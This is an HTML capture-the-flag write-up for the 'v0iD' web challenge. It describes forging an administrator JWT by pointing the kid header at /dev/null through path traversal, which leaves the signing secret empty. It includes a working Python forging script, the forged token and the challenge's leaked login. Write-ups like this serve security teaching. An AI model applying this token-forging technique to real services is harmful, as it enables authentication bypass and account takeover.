@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v0iD | Web</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../styles.css">
+</head>
+
+<body>
+
+    <header>
+        <div class="container nav">
+            <a href="../../" class="logo">NULL<span>EXISTENCE</span></a>
+        </div>
+    </header>
+
+    <section class="section">
+        <div class="container">
+
+            <h2 class="ctf-title">v0iD – Web Challenge</h2>
+
+            <p><strong>Author:</strong> NxStrip</p>
+            <p><strong>Category:</strong> Web</p>
+            <p><strong>Objective:</strong> Exploit a JWT <code>kid</code> Path Traversal vulnerability to forge a
+                session token with administrator privileges and capture the flag.</p>
+
+            <hr>
+
+            <h3>1. Reconnaissance &amp; Initial Access</h3>
+
+            <p>
+                Navigating to the target URL presents an "AUTHENTICATION PORTAL" requiring a Crew ID and Access Code.
+                Inspecting the HTML source reveals two hidden developer comments. Decoding the Base64 string in the
+                first
+                yields a troll message, but the second comment provides valid test credentials.
+            </p>
+
+            <p>
+                Logging in with <code>pilot_001</code> / <code>S3cret_P1lot_Ag3nt</code> grants access to the
+                <code>CREW PROFILE</code> dashboard with standard "CREW" clearance.
+            </p>
+
+            <hr>
+
+            <h3>2. Session Analysis</h3>
+
+            <p>
+                Intercepting authenticated requests to <code>/my-account</code> or <code>/bridge</code> reveals that
+                session
+                management is handled via a <strong>JSON Web Token (JWT)</strong> stored in the <code>session</code>
+                cookie.
+                Decoding it reveals:
+            </p>
+
+            <pre><code>// Header
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "galactic-key.key"
+}
+
+// Payload
+{
+  "sub": "pilot_001",
+  "role": "crew",
+  "iat": 1772191301
+}</code></pre>
+
+            <p>
+                The <code>kid</code> (Key ID) parameter pointing to a specific file strongly indicates a potential
+                Path Traversal vulnerability.
+            </p>
+
+            <hr>
+
+            <h3>3. Exploiting <code>kid</code> Path Traversal</h3>
+
+            <p>
+                The server uses the file specified in <code>kid</code> as the HS256 secret key. Because this input is
+                not
+                sanitised, we can use directory traversal (<code>../</code>) to point the application to a known system
+                file.
+            </p>
+
+            <p>
+                In Linux, <code>/dev/null</code> is an empty file. Setting <code>kid</code> to point there means the
+                server
+                will use an <strong>empty string</strong> as the secret to verify the token — a secret we fully control.
+            </p>
+
+            <pre><code>// Malicious Header
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "../../../../../../../../../../../dev/null"
+}</code></pre>
+
+            <hr>
+
+            <h3>4. Privilege Escalation &amp; Forging the Token</h3>
+
+            <p>
+                With the ability to sign our own tokens, we escalate privileges. Changing only the <code>"role"</code>
+                field
+                updates the UI but does not unlock the flag — the server strictly checks the user identity. Both
+                <code>"sub"</code> and <code>"role"</code> must be set to <code>administrator</code>.
+            </p>
+
+            <p>
+                Standard tools like <code>jwt.io</code> struggle with completely empty secrets, so we use a Python
+                script:
+            </p>
+
+            <pre><code>import jwt
+
+empty_secret = ""  # matches the contents of /dev/null
+
+header = {
+    "alg": "HS256",
+    "typ": "JWT",
+    "kid": "../../../../../../../../../../../dev/null"
+}
+
+payload = {
+    "sub": "administrator",
+    "role": "administrator",
+    "iat": 1772193472
+}
+
+forged_token = jwt.encode(payload, empty_secret, algorithm="HS256", headers=header)
+print(forged_token)</code></pre>
+
+            <hr>
+
+            <h3>5. Capturing the Flag</h3>
+
+            <p>
+                Running the script outputs our forged session cookie:
+            </p>
+
+            <pre><code>eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJpYXQiOjE3NzIxOTM0NzJ9.PPsSMv4xTSURP5A7tH4obR5sDw2Dcu8TzcSQAm7nTU8</code></pre>
+
+            <p>
+                Inject this into the browser by replacing the <code>session</code> cookie value in Developer Tools
+                (Storage / Application tab). On refresh, the application accepts the forged token, recognises us as
+                administrator, and reveals the flag in the admin panel.
+            </p>
+
+        </div>
+    </section>
+
+</body>
+
+</html>
